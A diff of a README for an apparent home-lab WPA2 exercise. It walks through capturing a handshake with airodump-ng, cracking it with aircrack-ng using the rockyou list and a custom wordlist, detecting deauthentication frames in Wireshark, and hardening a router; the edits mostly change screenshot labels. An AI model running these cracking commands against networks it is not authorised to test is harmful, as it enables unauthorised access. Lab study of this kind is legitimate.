@@ -17,25 +17,25 @@ sudo airmon-ng check kill
 sudo airmon-ng start wlan0  
 iwconfig
 ```
-📸 **Screenshot:** ![Monitor Mode](screenshots/Monitor_Mode.png)
+![Monitor Mode](screenshots/Monitor_mode.png)
 
 ### **1.2 Scan for Networks & Identify Target**
 ```bash
 sudo airodump-ng wlan0  
 ```
-📸 **Screenshot:** ![Network Scan](screenshots/Network_Scan.png)
+![Network Scan](screenshots/Network_Scan.png)
 
 ### **1.3 Capture WPA2 Handshake**
 ```bash
 sudo airodump-ng -c 5 --bssid 1C:3B:F3:73:99:4C -w capture wlan0  
 ```
-📸 **Screenshot:** ![Handshake Capture](screenshots/Handshake_Capture.png)
+![Handshake Capture](screenshots/Handshake_Capture.png)
 
 ### **1.4 Verify Handshake in Aircrack-ng**
 ```bash
 sudo aircrack-ng capture-05.cap  
 ```
-📸 **Screenshot:** ![Handshake Verification](screenshots/Handshake_Verification.png)
+![Handshake Verification](screenshots/Handshake_Verification.png)
 
 ---
 
@@ -44,19 +44,15 @@ sudo aircrack-ng capture-05.cap
 ### **2.1 Analyze Handshake in Wireshark**
 - Open `capture-05.cap` in Wireshark.
 - Apply filter: `eapol`
-📸 **Screenshot:** ![EAPOL Handshake](screenshots/EAPOL_Handshake.png)
+![EAPOL Handshake](screenshots/EAPOL_Handshake.png)
 
 ### **2.2 Expand Key Details in Wireshark**
 - Expand **802.1X Authentication** → **Key Information**
-📸 **Screenshot:** ![EAPOL Details](screenshots/EAPOL_Details.png)
+![EAPOL Details](screenshots/EAPOL_Details.png)
 
 ### **2.3 Detect Deauthentication Attack in Wireshark**
 - Apply filter: `wlan.fc.type_subtype == 0x0c`
-📸 **Screenshot:** ![Wireshark Detection](screenshots/Wireshark_Detection.png)
-
-### **2.4 Check Router Logs for Suspicious Activity**
-- Log into **Archer C6 Router** → System Tools → Logs.
-📸 **Screenshot (if any anomalies found):** `Router_Logs.png`
+![Wireshark Detection](screenshots/Wireshark_Detection.png)
 
 ---
 
@@ -66,14 +62,14 @@ sudo aircrack-ng capture-05.cap
 ```bash
 sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 1C:3B:F3:73:99:4C capture-05.cap
 ```
-📸 **Screenshot:** ![Password Cracking](screenshots/Password_Cracking.png)
+![Password Cracking](screenshots/Password_Cracking.png)
 
 ### **3.2 If RockYou Fails, Use a Custom Wordlist**
 ```bash
 echo -e "Test12345!\nTest12345\ntest12345!" > custom.txt  
 sudo aircrack-ng -w custom.txt -b 1C:3B:F3:73:99:4C capture-05.cap  
 ```
-📸 **Screenshot (if password is cracked):** ![Cracked Password](screenshots/Cracked_Password.png)
+![Cracked Password](screenshots/Cracked_Password.png)
 
 ---
 
@@ -82,17 +78,11 @@ sudo aircrack-ng -w custom.txt -b 1C:3B:F3:73:99:4C capture-05.cap
 ### **4.1 Strengthen WPA2 Security**
 - **Set Encryption:** WPA2-PSK with AES (**never TKIP**).
 - **Disable WPS** (to prevent WPS PIN attacks).
-📸 **Screenshot:** ![Secured Wi-Fi Settings](screenshots/Secured_WiFi_Settings.png)
+![Secured Wi-Fi Settings](screenshots/Secured_WiFi_Settings.png)
 
 ### **4.2 Enable MAC Filtering**
 - **Whitelist trusted MAC addresses** in router settings.
 - **Block unknown devices from connecting.**
-
-### **4.3 Detect Attacks Using Kismet (Optional)**
-```bash
-sudo kismet -c wlan0  
-```
-📸 **Screenshot (if attack is detected):** `Kismet_Detection.png`
 
 ---
 
